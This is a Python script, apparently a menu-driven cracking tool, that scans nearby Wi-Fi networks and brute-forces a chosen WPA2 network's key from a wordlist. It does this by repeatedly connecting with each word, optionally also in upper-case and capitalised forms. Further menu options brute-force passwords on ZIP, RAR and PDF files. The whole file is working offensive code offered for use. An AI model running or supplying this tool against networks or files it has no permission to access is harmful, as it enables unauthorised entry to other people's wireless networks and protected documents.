import time, pywifi, pyzipper, os, pikepdf
from unrar import rarfile
from pywifi import const
from pywifi import Profile
from pywifi import PyWiFi

def besar(passw):
    p = passw.upper()
    return p

def cracking_comb(ssid, word):
        print("Cracking Using Combination")
        wordlist = open(word, "r")
  
        for passw in wordlist:
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            passw=passw.strip()
            profile.key = passw
            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
            iface.remove_all_network_profiles()
            profile = iface.add_network_profile(profile)

            iface.connect(profile)
            time.sleep(4)
            if iface.status() == const.IFACE_CONNECTED:
                print(passw)
                print('PASSWORD FOUND! SSID:' ,ssid,'PASSWORD:',passw)
                break
            else:
                profile = pywifi.Profile()
                profile.ssid = ssid
                profile.auth = const.AUTH_ALG_OPEN
                profile.akm.append(const.AKM_TYPE_WPA2PSK)
                profile.cipher = const.CIPHER_TYPE_CCMP
                passw=passw.strip()
                b = besar(passw)
                profile.key = b
                wifi = pywifi.PyWiFi()
                iface = wifi.interfaces()[0]
                iface.remove_all_network_profiles()
                profile = iface.add_network_profile(profile)

                iface.connect(profile)
                time.sleep(4)
                if iface.status() == const.IFACE_CONNECTED:
                   print(passw)
                   print('PASSWORD FOUND! SSID:' ,ssid,'PASSWORD:',b)
                   break
                else:
                    profile = pywifi.Profile()
                    profile.ssid = ssid
                    profile.auth = const.AUTH_ALG_OPEN
                    profile.akm.append(const.AKM_TYPE_WPA2PSK)
                    profile.cipher = const.CIPHER_TYPE_CCMP
                    passw=passw.strip()
                    b = passw[0].upper() + passw[1:]
                    profile.key = b
                    wifi = pywifi.PyWiFi()
                    iface = wifi.interfaces()[0]
                    iface.remove_all_network_profiles()
                    profile = iface.add_network_profile(profile)
                    iface.connect(profile)
                    time.sleep(4)
                    if iface.status() == const.IFACE_CONNECTED:
                       print(b)
                       print('PASSWORD FOUND! SSID:' ,ssid,'PASSWORD:',b)
                       break             
        else:
                print("Password Not In List")

def cracking(ssid, word):
        print("Cracking")
        wordlist = open(word, "r")
  
        for passw in wordlist:
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            passw=passw.strip()
            profile.key = passw
            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
            iface.remove_all_network_profiles()
            profile = iface.add_network_profile(profile)

            iface.connect(profile)
            time.sleep(4)
            if iface.status() == const.IFACE_CONNECTED:
                print(passw)
                print('PASSWORD FOUND! SSID:' ,ssid,'PASSWORD:',passw)
                break
        else:
            print("Password Not In List")
            
def scan_wifi():              
    print("Scanning for wifi devices")
    print("Please Wait")
    wifi = pywifi.PyWiFi() 

    interface = wifi.interfaces()[0]

    interface.scan()
    time.sleep(5) 

    x = interface.scan_results()

    available_devices = []

    for i in x:
       available_devices.append(i.ssid)

    print("Available devices:")

    for j in available_devices:
       print(j)

    ssid = input("SSID:")
    word = input("Wordlist:")
    komb = input("Menggunakan Kombinasi(Y/T)")

    if komb == "y":
       cracking_comb(ssid, word)
    elif komb == "t":
        cracking(ssid, word)

def crack_file():
    filename = input("Nama File:")
    word = input("Wordlist:")
    password = open(word, 'r')
    split = os.path.splitext(filename)

    f1 = split[1]

    if f1 == ".zip":
      for psw in password:
        psw = psw.strip()

        try:
         with pyzipper.AESZipFile(filename, 'r', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as ez:
          ez.extractall(pwd=str.encode(psw))
          print("Password File:" ,filename, "Is:" ,psw)
          break
        except Exception as e:
         print(e)
    elif f1 == ".rar":
        rar = rarfile.RarFile(filename)

        for w in password:
         try:
           w = w.strip()
           rar.extractall(pwd=w)
           print("Filename:" ,filename, "Password:" ,w)
           break
         except:
          print("Password Not Match, Trying Craccking...")

def pdfcrack():
    pdf_file = input("Name PDF File:")
    word = input("Wordlist:")
    w = open(word, 'r')

    for wo in w:
     wo = wo.strip()
     try:
      with pikepdf.open(pdf_file, password=wo) as pdf:
        print("Password PDF File:" ,pdf_file, "Is:" ,wo)
        break
     except:
        continue
    else:
        print("Password Not Found")
    
print("1. Wifi Password Crack")
print("2. ZIP/RAR Password Crack")
print("3. PDF Password Crack")
k = input(">")

if k == "1":
    scan_wifi()
elif k == "2":
    crack_file()
elif k == "3":
    pdfcrack()
